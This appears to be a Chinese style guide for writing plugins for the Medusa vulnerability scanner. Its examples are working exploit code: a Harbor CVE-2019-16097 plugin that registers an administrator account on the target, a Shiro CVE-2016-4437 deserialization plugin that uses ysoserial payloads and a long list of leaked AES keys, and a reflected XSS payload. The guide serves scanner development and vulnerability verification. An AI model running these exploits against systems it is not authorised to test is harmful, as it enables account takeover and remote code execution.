## 常规插件模板

> 如果漏洞可以执行远程命令的话，需要在常规模板中添加命令执行模板

以`Harbor`插件作为例子

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,randoms,ErrorHandling
import json
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2019-16097" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-2-19"  # 插件编辑时间
        self.info['disclosure'] = '2019-9-19'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "HarborAnyAdministratorRegistrationVulnerability"  # 插件名称
        self.info['name'] ='Harbor任意管理员注册漏洞' #漏洞名称
        self.info['affects'] = "Harbor"  # 漏洞组件
        self.info['desc_content'] = "版本中的core/api/user.go文件存在安全漏洞。若开放注册功能，攻击者可利用该漏洞创建admin账户。注册功能默认开放。攻击者可以以管理员身份下载私有项目并审计；可以删除或污染所有镜像。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "Harbor 1.7.6之前版本\r\nHarbor 1.8.3之前版本"  # 这边填漏洞影响的版本
        self.info['suggest'] = "升级最新Harbor版本"  # 修复建议
        self.info['details'] = Medusa  # 结果


def medusa(**kwargs)->None:
    url=kwargs.get("Url")#获取传入的url参数
    Headers=kwargs.get("Headers")#获取传入的头文件
    proxies=kwargs.get("Proxies")#获取传入的代理参数
    try:
        payload = '/api/users'
        payload_url = url + payload
        #在原始传入的标头中添加需要的其他标头
        Headers["Accept"]="application/json"
        Headers["Content-Type"]="application/json"
        
        rm = "MedusaTextPoc"+randoms().result(5)  # 获取随机数
        data= {
            "username": rm,
            "email": rm+"@qq.com",
            "realname": rm,
            "password": rm,
            "comment": rm,
            "has_admin_role": True
        }

        data = json.dumps(data)
        resp = requests.post(payload_url,data=data,headers=Headers, proxies=proxies, timeout=6, verify=False)
        head = resp.headers.get("Location")
        code = resp.status_code
        if code == 201 and head.find("/api/users/")!=-1:
            Medusa = "{}存在Harbor任意管理员注册漏洞\r\n验证数据:\r\n漏洞位置:{}\r\n账号:{}\r\n密码:{}\r\n注册账号数量:{}\r\n".format(url,
                                                                                                          payload_url,
                                                                                                          rm,rm,head)
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)  # 调用写入类传入URL和错误插件名
```

### 导入数据包

如果需要导入`ClassCongregation`或者之类的包，最好使用如下方法，这样可以提高代码速度，以及降低打包的体量

```python
#推荐使用
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,randoms,ErrorHandling
#不推荐使用
import ClassCongregation
```

### VulnerabilityInfo函数

```python
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['disclosure']='2019-10-13'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "XXXXXXXXXXXXXXXXXXXX"  # 插件名称
        self.info['name'] ='泛微OA_WorkflowCenterTreeData接口注入漏洞' #漏洞名称
        self.info['affects'] = "该漏洞是哪个组件的，比如这个插件就是叫：泛微OA"  # 漏洞组件
        self.info['desc_content'] = "漏洞描述，比如在组件的哪个版本，哪个位置，有什么危害，什么地方没写好或者没过滤导致的等"  # 漏洞描述
        self.info['rank'] = "这边写危害等级，比如这个插件就该写:高危"  # 漏洞等级
        self.info['suggest'] = "给出缓解措施，或者解决办法"  # 修复建议
        self.info['version'] = "xxx版本-xxx版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果需要传入的恒定不变

```

| 函数名       | 值           | 备注                                                         |
| :----------- | ------------ | ------------------------------------------------------------ |
| number       | CVE编号     |  如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD         |
| author       | 插件作者     |                                                              |
| create_date  | 插件编辑时间 | 格式为：年-月-日                                             |
| algroup      | 插件名称     | 要和文件名相同，并且只能英文（必须使用驼峰命名法        |
| name         | 漏洞名称     | 插件的中文名，要与插件名翻译结果相同                         |
| affects      | 漏洞组件     | 该漏洞存在哪个组件中的哪个版本                               |
| desc_content | 漏洞描述     | 漏洞描述，比如在组件的哪个版本，哪个位置，有什么危害，什么地方没写好或者没过滤导致的等 |
| rank         | 漏洞等级     | 分为：严重、高危、中危、低危四个种类                         |
| suggest      | 修复建议     | 给出缓解措施或者解决办法                                   |
| disclosure | 披露时间 | 漏洞披露时间，如果不知道就写编写插件的时间 |
| version      | 漏洞所影响的版本         | 只要写漏洞所影响的版本范围，适用于那些版本     |
| disclosure | 披露时间 | 漏洞披露时间，如果不知道就写编写插件的时间 |

### medusa函数

```python
def medusa(**kwargs)->None:
    url=kwargs.get("Url")#获取传入的url参数
    Headers=kwargs.get("Headers")#获取传入的头文件
    proxies=kwargs.get("Proxies")#获取传入的代理参数
    try:
        payload = '/api/users'
        payload_url = url + payload
        #在原始传入的标头中添加需要的其他标头
        Headers["Accept"]="application/json"
        Headers["Content-Type"]="application/json"
        
        rm = "MedusaTextPoc"+randoms().result(5)  # 获取随机数
        data= {
            "username": rm,
            "email": rm+"@qq.com",
            "realname": rm,
            "password": rm,
            "comment": rm,
            "has_admin_role": True
        }

        data = json.dumps(data)
        resp = requests.post(payload_url,data=data,headers=Headers, proxies=proxies, timeout=6, verify=False)
        head = resp.headers.get("Location")
        code = resp.status_code
        if code == 201 and head.find("/api/users/")!=-1:
            Medusa = "{}存在Harbor任意管理员注册漏洞\r\n验证数据:\r\n漏洞位置:{}\r\n账号:{}\r\n密码:{}\r\n注册账号数量:{}\r\n".format(url,
                                                                                                          payload_url,
                                                                                                          rm,rm,head)
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)  # 调用写入类传入URL和错误插件名
```

##### 注意点:

- ###### 固定提取参数

  需要从传入的`kwargs`参数中固定提取这几个参数

  ```
  url=kwargs.get("Url")#获取传入的url参数
  Headers=kwargs.get("Headers")#获取传入的头文件
  proxies=kwargs.get("Proxies")#获取传入的代理参数
  ```

- ###### 端口

  如果当前插件需要使用固定的端口，请调用**ClassCongregation**文件中的`PortReplacement`函数，把当前的Url和端口传入进去

  ```python
  Url=PortReplacement(Url,Port)
  ```

- ###### headers
  - 该参数需要在传入的`kwargs`参数中提取

  - 如果你的插件需要使用到某些特定的标识的时候，使用字典方式添加内容
  
    ```python
    Headers["Accept"]="application/json"
    Headers["Content-Type"]="application/json"
    ```

- ###### payload

  - `payload`必须符合随机性，比如这个插件所使用的一些数据不管填写什么都可以通过的话，尽量在后面加随机数，这样能够保证`payload`的唯一性，这样验证的时候就能保住数据的唯一性。(特别是注册账号，`DNSlog`，写文件，回显文件之类的`payload`)

- ###### 数据获取

  - `requests`请求后的数据注意事项

    - `status_code`赋值为`code`意义就是返回的状态码，该值名字统一为`code`不可修改

    - `text`赋值为`con`意义就是返回文本内容，该值名字统一为`con`不可修改

    - 请求后的返回`header`头必须使用`resp.headers.get("XXX")`获取，禁止使用`resp.headers["xxx"]`获取。(`xxx`值为你要获取返回`header`值中某一项的名字)

    - 当使用了`request.session()`时，应该在插件结束时使用`request.close()`来主动关闭连接

      ```python
      s=requests.session()
      get=s.get("www.ascotbe.com")
      get.close()
      ```

    - 任何请求必须添加上这三个值

      ```python
      headers=Headers
      timeout=6
      verify=False
      ```

- ###### Medusa
  - 该值为漏洞扫描结束的值，需要传给类中，之后封装好调用类写入数据库中

  - 返回结果要可读并且要那种一眼就能看出来的,必须可读容易验证

    ```asciiarmor
    1.1.1.1存在Harbor任意管理员注册漏洞
    验证数据:
    漏洞位置:http://1.1.1.1:80/api/users
    账号:MedusaTextPoc4c5vi
    密码:MedusaTextPoc4c5vi
    注册账号数量:/api/users/10
    ```

  - 如果数据是`Get`请求或者是`Post`请求并存在数据包，应该返回如下信息，验证漏洞直接使用数据包即可(利用`Post`请求举例，`Get`同理)

    ```http
    POST / HTTP/1.1
    Host: www.ascotbe.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/ocsp-request
    Content-Length: 83
    Connection: close
    
    id=1&name=xxx
    ```

  - 比如远程执行如果有回显返回回显内容，如果无回显返回`DNSlog`验证数据内容

  
  
- ###### 判断漏洞存在
  - `if`判断一定要唯一性，唯一的返回状态码，唯一只在该漏洞存在的字符串正常页面不会存在的，如下所示:

    ```python
    if code == 201 and head.find("/api/users/")!=-1:
        Medusa = "{}存在Harbor任意管理员注册漏洞\r\n 验证数据:\r\n漏洞位置:{}\r\n账号:{}\r\n密码:{}\r\n注册账号数量:{}\r\n".format(url,
                                                                                                      payload_url,
                                                                                                      rm,rm,head)
        _t = VulnerabilityInfo(Medusa)
    	VulnerabilityDetails(_t.info, resp,UnixTimestamp).Write()  # 传入url和扫描到的数据
        WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    ```
    
  - 如果某些数据请求的数据可以自定义，并且返回值中会返回用户自定义的值时，应当在调用随机数的类产生随机数后插入数据`deom`如下
  
    ```python
    from ClassCongregation import randoms
    rm = randoms().result(10)#生成10个随机数
    payload = '/whizzywig/wb.php?d=%27%3E%3Cscript%3Ealert%28%27{}%27%29%3C/script%3E'.format(rm)#传入随机数
    payload_url = scheme + "://" + url + ":" + str(port) + payload
    resp = requests.get(payload_url, timeout=6, verify=False)
    con = resp.text
    if con.find('<script>alert("' + rm + '")</script>') != -1:#随机数内容
        Medusa = "{}存在CMSimple跨站脚本漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:{}\r\n".format(url, payload_url, con)
    ```
  
  - 判断一定要注意重要的两点
  
    - 数据一定要唯一性，这样可以减少误报！！！
    - 数据一定要可读，不然扫描除结果，返回的内容不可读，那只是无用功！！！
  
- ###### 传入请求值

  需要在最后判断成功后再`VulnerabilityDetails`函数中**第二个参数**传入最后一个`request`请求的返回值

  ```python
  VulnerabilityDetails(_t.info, resp,**kwargs).Write()
  ```

- ###### 多个payload
  
  - 切记`try...except`一定要在`for`循环里面，这样如果一个`payload`出错后面的代码也已经可以运行
    
  -  `2.8`插件规范版本中加入了写入类，方便循环写入文件
    
  -  `3.1`中添加注意事项
    
      -  `requests`请求时禁止使用如下方法
      
        ```python
        s = requests.session()
        resp = s.get(...)
        ```
      
      - 应当为这种请求
      
        ```python
        resp = requests.get(...)
        ```
      
      - 因为`requests.session()`会进行长连接，导致某些时候数据碰撞报错
      
    - 整体替换如下:
    
      ```python
      def medusa(**kwargs)->None:
          url=kwargs.get("Url")#获取传入的url参数
          Headers=kwargs.get("Headers")#获取传入的头文件
          proxies=kwargs.get("Proxies")#获取传入的代理参数
          Payloads = ['x', 'xx', 'xxx', 'xxxx']
          for payload in Payloads:
              try:
                  payload_url =url+ payload
                  resp = requests.post(...)
                  con = resp.text
                  code = resp.status_code
                  if code == 200 and con.find(....):
                      Medusa = "{}存在XXX漏洞\r\n验证数据:\r\nRequests:{}\r\n".format(url, con)
                  _t = VulnerabilityInfo(Medusa)
                  VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
                  WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
              except Exception as e:
                  _ = VulnerabilityInfo('').info.get('algroup')
                  ErrorHandling().Outlier(e, _)
                  ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)  # 调用写入类传入URL和错误插件名
      ```

## 多线程模板

> 如果插件中有for循环请求并且循环基数超过3个，需要把常规插件模板替换为该模板

下面以`Shiro`插件作为例子

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,GetToolFilePath,ErrorHandling,Dnslog,ThreadPool
import urllib3
import requests
import uuid
import base64
import time
import subprocess
from Crypto.Cipher import AES
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2016-4437" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-2-19"  # 插件编辑时间
        self.info['disclosure'] = '2016-6-7'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "ShiroRememberMeDeserializationCommandExecutionVulnerability"  # 插件名称
        self.info['name'] ='ShiroRememberMe反序列化命令执行漏洞' #漏洞名称
        self.info['affects'] = "Shiro"  # 漏洞组件
        self.info['desc_content'] = "ApacheShiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值>Base64解码–>AES解密–>反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "Shiro低于<1.2.4版本，由于秘钥泄露高于1.24版本的也会执行代码"  # 这边填漏洞影响的版本
        self.info['suggest'] = "升级最新Shiro版本"  # 修复建议
        self.info['details'] = Medusa  # 结果


def medusa(**kwargs)->None:
    url=kwargs.get("Url")#获取传入的url参数
    Headers=kwargs.get("Headers")#获取传入的头文件
    proxies=kwargs.get("Proxies")#获取传入的代理参数
    ExpClass = "JRMPClient"
    CipherKey = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==",
                 "4AvVhmFLUs0KTA3Kprsdag==", "5AvVhmFLUs0KTA3Kprsdag==",
                 "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==",
                 "wGiHplamyXlVB11UXWol8g==",
                 "Z3VucwAAAAAAAAAAAAAAAA==", "MTIzNDU2Nzg5MGFiY2RlZg==", "U3ByaW5nQmxhZGUAAAAAAA==",
                 "fCq+/xW488hMTCD+cmJ3aQ==", "1QWLxg+NYmxraMoxAXu/Iw==", "ZUdsaGJuSmxibVI2ZHc9PQ==",
                 "L7RioUULEFhRyxM7a2R/Yg==",
                 "r0e3c16IdVkouZgk1TKVMg==", "bWluZS1hc3NldC1rZXk6QQ==", "a2VlcE9uR29pbmdBbmRGaQ==",
                 "WcfHGU25gNnTxTlmJMeSpw==",
                 "OY//C4rhfwNxCQAQCrQQ1Q==",
                 "5J7bIJIV0LQSN3c9LPitBQ==",
                 "f/SY5TIve5WWzT4aQlABJA==",
                 "bya2HkYo57u6fWh5theAWw==",
                 "WuB+y2gcHRnY2Lg9+Aqmqg==",
                 "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
                 "3qDVdLawoIr1xFd6ietnwg==",
                 "ZWvohmPdUsAWT3=KpPqda",
                 "YI1+nBV//m7ELrIyDHm6DQ==",
                 "6Zm+6I2j5Y+R5aS+5ZOlAA==",
                 "2A2V+RFLUs+eTA3Kpr+dag==",
                 "6ZmI6I2j3Y+R1aSn5BOlAA==",
                 "SkZpbmFsQmxhZGUAAAAAAA==",
                 "2cVtiE83c4lIrELJwKGJUw==",
                 "fsHspZw/92PrS3XrPW+vxw==",
                 "XTx6CKLo/SdSgub+OPHSrw==",
                 "sHdIjUN6tzhl8xZMG3ULCQ==",
                 "O4pdf+7e+mZe8NyxMTPJmQ==",
                 "HWrBltGvEZc14h9VpMvZWw==",
                 "rPNqM6uKFCyaL10AK51UkQ==",
                 "Y1JxNSPXVwMkyvES/kJGeQ==",
                 "lT2UvDUmQwewm6mMoiw4Ig==",
                 "MPdCMZ9urzEA50JDlDYYDg==",
                 "xVmmoltfpb8tTceuT5R7Bw==",
                 "c+3hFGPjbgzGdrC+MHgoRQ==",
                 "ClLk69oNcA3m+s0jIMIkpg==",
                 "Bf7MfkNR0axGGptozrebag==",
                 "1tC/xrDYs8ey+sa3emtiYw==",
                 "ZmFsYWRvLnh5ei5zaGlybw==",
                 "cGhyYWNrY3RmREUhfiMkZA==",
                 "IduElDUpDDXE677ZkhhKnQ==",
                 "yeAAo1E8BOeAYfBlm4NG9Q==",
                 "cGljYXMAAAAAAAAAAAAAAA==",
                 "2itfW92XazYRi5ltW0M2yA==",
                 "XgGkgqGqYrix9lI6vxcrRw==",
                 "ertVhmFLUs0KTA3Kprsdag==",
                 "5AvVhmFLUS0ATA4Kprsdag==",
                 "s0KTA3mFLUprK4AvVhsdag==",
                 "hBlzKg78ajaZuTE0VLzDDg==",
                 "9FvVhtFLUs0KnA3Kprsdyg==",
                 "d2ViUmVtZW1iZXJNZUtleQ==",
                 "yNeUgSzL/CfiWw1GALg6Ag==",
                 "NGk/3cQ6F5/UNPRh8LpMIg==",
                 "4BvVhmFLUs0KTA3Kprsdag==",
                 "MzVeSkYyWTI2OFVLZjRzZg==",
                 "CrownKey==a12d/dakdad",
                 "empodDEyMwAAAAAAAAAAAA==",
                 "A7UzJgh1+EWj5oBFi+mSgw==",
                 "YTM0NZomIzI2OTsmIzM0NTueYQ==",
                 "c2hpcm9fYmF0aXMzMgAAAA==",
                 "i45FVt72K2kLgvFrJtoZRw==",
                 "U3BAbW5nQmxhZGUAAAAAAA==",
                 "ZnJlc2h6Y24xMjM0NTY3OA==",
                 "Jt3C93kMR9D5e8QzwfsiMw==",
                 "MTIzNDU2NzgxMjM0NTY3OA==",
                 "vXP33AonIp9bFwGl7aT7rA==",
                 "V2hhdCBUaGUgSGVsbAAAAA==",
                 "Z3h6eWd4enklMjElMjElMjE=",
                 "Q01TX0JGTFlLRVlfMjAxOQ==",
                 "ZAvph3dsQs0FSL3SDFAdag==",
                 "Is9zJ3pzNh2cgTHB4ua3+Q==",
                 "NsZXjXVklWPZwOfkvk6kUA==",
                 "GAevYnznvgNCURavBhCr1w==",
                 "66v1O8keKNV3TTcGPK1wzg==",
                 "SDKOLKn2J1j/2BHjeZwAoQ==",
                 ]
    BLOCK_SIZE = AES.block_size
    PAD_FUNC = lambda s: s + ((BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)).encode()
    AES_MODE = AES.MODE_CBC
    AES_IV = uuid.uuid4().bytes
    payload_url = url
    YsoserialPath=GetToolFilePath().Result()+"ysoserial.jar"
    Pool=ThreadPool()
    try:
        for key in CipherKey:
            DL = Dnslog()
            popen = subprocess.Popen(["java", "-jar", YsoserialPath, ExpClass, DL.dns_host()], stdout=subprocess.PIPE)
            file_body = PAD_FUNC((popen).stdout.read())
            Pool.Append(task,Pool=Pool,Url=url,file_body=file_body,key=key,AES_MODE=AES_MODE,AES_IV=AES_IV,payload_url=payload_url,DL=DL,proxies=proxies,Uid=kwargs.get("Uid"),Sid=kwargs.get("Sid"))
        Pool.Start(20)#启动线程池
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorLog().Write("Plugin Name:"+_+" ThreadPool ",e)  # 调用写入类传入URL和错误插件名

def task(**kwargs):
    DL=kwargs.get("DL")
    payload_url=kwargs.get("payload_url")
    key=kwargs.get("key")
    url=kwargs.get("Url")
    try:
        encryptor = AES.new(base64.b64decode(key), kwargs.get("AES_MODE"), kwargs.get("AES_IV"))
        base64_ciphertext = base64.b64encode(kwargs.get("AES_IV") + encryptor.encrypt(kwargs.get("file_body")))
        cookies = {"jeesite.session.id": "3f8a61ec-27e2-425c-9724-f96ba0c1e512",
                   "rememberMe": base64_ciphertext.decode()}
        resp=requests.get(payload_url, cookies=cookies,  proxies=kwargs.get("proxies"), timeout=6, verify=False)
        time.sleep(3)
        if DL.result():
            Medusa = "{} 存在ShiroRememberMe反序列化命令执行漏洞(CVE-2016-4437)\r\n验证数据:\r\n漏洞位置:{}\r\n秘钥:{}\r\nHeaders请求头:{}\r\nDNSLOG请求值:{}\r\nDNSLOG数据:{}\r\n".format(
                url, payload_url, key, cookies, DL.dns_host(), DL.dns_text())
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp, **kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        ErrorLog().Write("Plugin Name:" + _ + " || Target Url:" + url, e)  # 调用写入类传入URL和错误插件名
```

### medusa函数

```python
def medusa(**kwargs)->None:
    url=kwargs.get("Url")#获取传入的url参数
    Headers=kwargs.get("Headers")#获取传入的头文件
    proxies=kwargs.get("Proxies")#获取传入的代理参数
    ExpClass = "JRMPClient"
    CipherKey = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag=="]
    BLOCK_SIZE = AES.block_size
    PAD_FUNC = lambda s: s + ((BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)).encode()
    AES_MODE = AES.MODE_CBC
    AES_IV = uuid.uuid4().bytes
    payload_url = url
    YsoserialPath=GetToolFilePath().Result()+"ysoserial.jar"
    Pool=ThreadPool()
    try:
        for key in CipherKey:
            DL = Dnslog()
            popen = subprocess.Popen(["java", "-jar", YsoserialPath, ExpClass, DL.dns_host()], stdout=subprocess.PIPE)
            file_body = PAD_FUNC((popen).stdout.read())
            Pool.Append(task,Pool=Pool,Url=url,file_body=file_body,key=key,AES_MODE=AES_MODE,AES_IV=AES_IV,payload_url=payload_url,DL=DL,proxies=proxies,Uid=kwargs.get("Uid"),Sid=kwargs.get("Sid"))
        Pool.Start(20)#启动线程池
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorLog().Write("Plugin Name:"+_+" ThreadPool ",e)  # 调用写入类传入URL和错误插件名

```

##### 注意点：

- 所有全局变量都存放这边，也就是说这个参数并不会在后面需要改变了，比如处理好的目标连接`payload_url `、**ysoserial.jar**的路径地址`YsoserialPath`、循环使用**Key**的列表`CipherKey`等参数都存放到这个函数中
- 循环调用需要在`try....except`中
- 如果所执行的代码在其他线程中的判断也能找到的话，该代码需要写在`for`循环中，比如上面的`Dnslog()`函数，如果所有线程都使用同一个DNSLOG的话就会导致如果其中一个执行成功，后面的所有线程都能找到请求的这个值，导致大量的误报
- 每个多线程必须`for`循环上面定义一个 `ThreadPool()`线程池，然后使用进程池中的`Append()`函数发送到进程池中，最后循环结束后调用线程池中的`Start(10)`函数来启动所有的线程
- `Append()`函数的第一个参数必须是需要调用的函数，这边统一叫做`task`函数，传入的参数必须添加`Uid=kwargs.get("Uid")`和`Sid=kwargs.get("Sid")`参数
- `task`函数需要使用到的参数、初始化的后的类都必须使用`Append()`函数来传入，具体方式见上述函数用法

### task函数

```python
def task(**kwargs):
    DL=kwargs.get("DL")
    payload_url=kwargs.get("payload_url")
    key=kwargs.get("key")
    url=kwargs.get("Url")
    try:
        encryptor = AES.new(base64.b64decode(key), kwargs.get("AES_MODE"), kwargs.get("AES_IV"))
        base64_ciphertext = base64.b64encode(kwargs.get("AES_IV") + encryptor.encrypt(kwargs.get("file_body")))
        cookies = {"jeesite.session.id": "3f8a61ec-27e2-425c-9724-f96ba0c1e512",
                   "rememberMe": base64_ciphertext.decode()}
        resp=requests.get(payload_url, cookies=cookies,  proxies=kwargs.get("proxies"), timeout=6, verify=False)
        time.sleep(3)
        if DL.result():
            Medusa = "{} 存在ShiroRememberMe反序列化命令执行漏洞(CVE-2016-4437)\r\n验证数据:\r\n漏洞位置:{}\r\n秘钥:{}\r\nHeaders请求头:{}\r\nDNSLOG请求值:{}\r\nDNSLOG数据:{}\r\n".format(
                url, payload_url, key, cookies, DL.dns_host(), DL.dns_text())
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp, **kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        ErrorLog().Write("Plugin Name:" + _ + " || Target Url:" + url, e)  # 调用写入类传入URL和错误插件名
```

这个函数把之前**常规插件模板**中的`medusa`函数的核心请求调用到这边

##### 注意点：

- 如果多个地方需要使用的参数或者初始化的类，并且是从**多线程模板**中的`medusa`函数传入的必须在最开始的地方获取这样可以减少开销，比如上面的`url`参数、`DL`类的地址
- 所有从**多线程模板**中的`medusa`函数传入的参数必须使用`kwargs.get("XXXXX")`的方式来获取
- **常规插件模板**中写入数据库的`VulnerabilityDetails(_t.info, url,**kwargs).Write()`类初始化传入的`**kwargs`值必须替换，整体替换为`VulnerabilityDetails(_t.info, url, Uid=kwargs.get("Uid"),Sid=kwargs.get("Sid")).Write()`

## 插件代码规范

###### 代码中未使用的Package尽量删除

![1.png](https://github.com/Ascotbe/Random-img/blob/master/docute/1.png?raw=true)

###### 命令执行规范

所有的命令执行默认使用无害的DNSLOG，禁止使用有危害的命令！！

###### Dnslog使用规范

- 禁止使用如下形式

  ```python
  from ClassCongregation import Dnslog
  #使用改方法会导致类初始化2次获取的随机数和判断中所获取的随机数不同
  Dnslog().dns_host()#获取随机数
  Dnslog().result()#判断随机数是否请求成功
  ```

- 应当写成如下形式

  ```python
  from ClassCongregation import Dnslog
  dns=Dnslog()#首先初始化
  dns.dns_host()#获取随机数
  dns.result()#判断随机数是否请求成功
  dns.dns_text()#获取DNSLOG请求返回数据
  ```


###### 变量命名规范

- 仅限使用`驼峰命名法` 、`匈牙利命名法`
- 默认使用`驼峰命名法`

###### 判断语句

- 在判断中与`None` `False` `True`等值判断时，使用`is` `not` `is not`尽量避免使用`==` `!=`

###### 禁止使用

- 插件中禁止使用`sys.exit()` `os.exit()`这两个函数，会导致主程序结束，如果要结束插件使用`return`即可

###### Https

- 如果请求中包含`HTTPS`，可以使用`verify=False`来关闭SSL证书验证

###### 异常捕获

- 每个函数必须存在`try...except`来保证扫描器正常使用

- 异常捕获`except`必须要有返回值 

  ```python
  except Exception:
      _ = VulnerabilityInfo('').info.get('algroup')
      _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
  ```
  


###### 清理工作

- 插件写完后需要清除所有的`pirint()`函数，以及不必要的变量

###### 多个Payload的for循环

- 当有多个`payload`需要循环的时候必须把`for`循环放到`try`异常捕获里面循环，这很重要！！！！！

###### 写入函数

- 一定要加入`WriteFile().result(str(url),str(Medusa))`这段代码写入

###### 获取字典

​	比如说这个字典`dict = {'Name': 'Runoob', 'Age': 27}`

- 禁止使用`dict['Name']`这种方式来获取`Name`参数的值
- 请使用`dict.get('Name')`来获取`Name`参数的值

​	